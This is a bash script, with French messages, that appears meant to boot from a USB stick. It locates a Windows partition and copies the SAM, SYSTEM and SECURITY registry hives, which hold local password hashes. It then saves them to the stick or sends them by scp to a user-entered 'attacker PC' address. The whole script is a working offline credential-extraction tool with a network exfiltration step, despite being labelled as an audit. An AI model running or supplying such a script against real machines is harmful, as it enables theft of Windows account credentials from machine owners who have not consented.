#!/bin/bash
set -euo pipefail

SCRIPT_PATH="$(readlink -f "$0")"
USB_MOUNT="$(dirname "$SCRIPT_PATH")"
WIN_MOUNT="/mnt/windows"
DATE_TAG=$(date +"%Y-%m-%d_%H-%M-%S")

WIN_PART=$(lsblk -pnlo NAME,FSTYPE | awk '$2=="ntfs"{print $1}' | while read p; do
    mkdir -p "$WIN_MOUNT"
    mount -o ro "$p" "$WIN_MOUNT" 2>/dev/null || continue
    if [ -f "$WIN_MOUNT/Windows/System32/config/SAM" ]; then
        echo "$p"
        umount "$WIN_MOUNT"
        break
    fi
    umount "$WIN_MOUNT"
done)

[ -z "${WIN_PART:-}" ] && { echo "[!] Partition Windows non trouvée"; exit 1; }

echo "[+] Partition Windows détectée : $WIN_PART"

mount -o ro "$WIN_PART" "$WIN_MOUNT"

TEMP_DEST="/tmp/audit_windows_$DATE_TAG"
mkdir -p "$TEMP_DEST/sam_raw" "$TEMP_DEST/chntpw_output"

cp "$WIN_MOUNT/Windows/System32/config/"{SAM,SYSTEM,SECURITY} "$TEMP_DEST/sam_raw/"

echo "=== Méthode de transfert ==="
echo "1. SCP (transfert réseau)"
echo "2. USB (transfert local - par défaut)"
read -r -p "Transférer la base SAM via SCP (1) ou USB (2)? [2]: " TRANSFER_METHOD

TRANSFER_METHOD=${TRANSFER_METHOD:-2}
if [ "$TRANSFER_METHOD" == "2" ]; then
    DEST="$USB_MOUNT/audit_windows_$DATE_TAG"
    echo "[+] Transfert vers USB..."
    mv "$TEMP_DEST" "$DEST"
    FINAL_DEST="$DEST"
    echo "Données enregistrées dans : $DEST"
else
    read -r -p "Entrez le nom d'utilisateur pour le transfert SCP : " SCP_USER
    read -r -p "Entrez l'adresse IP du PC attaquant : " ATTACKER_IP
    echo "[+] Tentative de transfert SCP vers $SCP_USER@$ATTACKER_IP..."
    ARCHIVE_NAME="audit_windows_$DATE_TAG.tar.gz"
    tar -czf "/tmp/$ARCHIVE_NAME" -C /tmp "audit_windows_$DATE_TAG"
    scp "/tmp/$ARCHIVE_NAME" "$SCP_USER@$ATTACKER_IP:/tmp/"
fi

umount "$WIN_MOUNT"
echo "Extraction terminée"
